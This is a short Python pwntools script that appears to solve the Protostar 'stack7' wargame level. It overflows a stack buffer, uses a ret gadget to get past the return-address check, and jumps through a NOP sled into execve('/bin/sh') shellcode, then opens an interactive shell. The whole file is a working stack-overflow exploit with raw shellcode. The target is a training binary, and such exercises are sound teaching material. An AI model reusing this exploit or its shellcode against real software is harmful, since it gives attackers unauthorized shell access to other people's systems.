#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/stack7'
p=sh.run(binarypath)
overflow="A"*80
stack_addr=0xbffffd00
Shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
NOP="\x90"*50
# we first go to ret which basically puts
#stack_addr to eip but the ret addr of the
#function is ret which satisfies restriction
ret=0x08048553
payload=overflow+p32(ret)+p32(stack_addr)+NOP+Shellcode
p.sendline(payload)
p.interactive()